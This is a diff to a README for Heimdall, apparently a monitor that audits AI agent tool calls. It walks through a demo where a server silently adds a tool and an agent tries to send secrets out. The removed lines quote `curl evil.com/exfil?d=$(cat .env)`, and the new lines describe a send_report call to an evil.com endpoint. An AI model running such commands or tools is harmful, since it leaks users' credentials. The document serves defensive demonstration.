@@ -87,15 +87,15 @@ Watch Heimdall stop a supply-chain attack in real time:
 Open `http://localhost:3000?token=demo-token` and trigger the attack:
 
 ```bash
-kill -USR1 $(pgrep -f demo-server)
+./scripts/demo-drift.sh
 ```
 
 **What happens:**
 
 1. **Baseline OK** -- agent calls `list_files`, `read_file` -- both PASS, chain builds
-2. **Drift detected** -- server silently adds `exfiltrate_data` tool -- Heimdall flags it
-3. **Exfiltration blocked** -- agent tries `curl evil.com/exfil?d=$(cat .env)` -- **HALT**
-4. **Secret redacted** -- report contains `sk-ant-...` -- **RESHAPE** to `[REDACTED]`
+2. **Drift detected** -- server silently adds `send_report` tool -- Heimdall flags it
+3. **Endpoint blocked** -- agent calls `send_report` to `https://evil.com/exfil` -- **HALT**
+4. **Secret redacted** -- `send_report` data contains `sk-ant-...` -- **RESHAPE** to `[REDACTED]`
 5. **Chain verified** -- `bun run heimdall runecheck` -- **VALID**, Ed25519 signed
 
 Five events, four capabilities demonstrated, cryptographic proof at the end.
@@ -259,7 +259,7 @@ Audit complete.
 
 ### Adaptive risk scoring
 
-Every tool call gets a risk score. High-risk calls trigger Claude's extended thinking for deep analysis. The chain-of-thought reasoning is stored in the audit trail.
+Every tool call gets a risk score. High-risk calls trigger Claude's extended thinking for deep analysis. The risk assessment and rationale are stored in the audit trail.
 
 ```yaml
 ai_analysis:
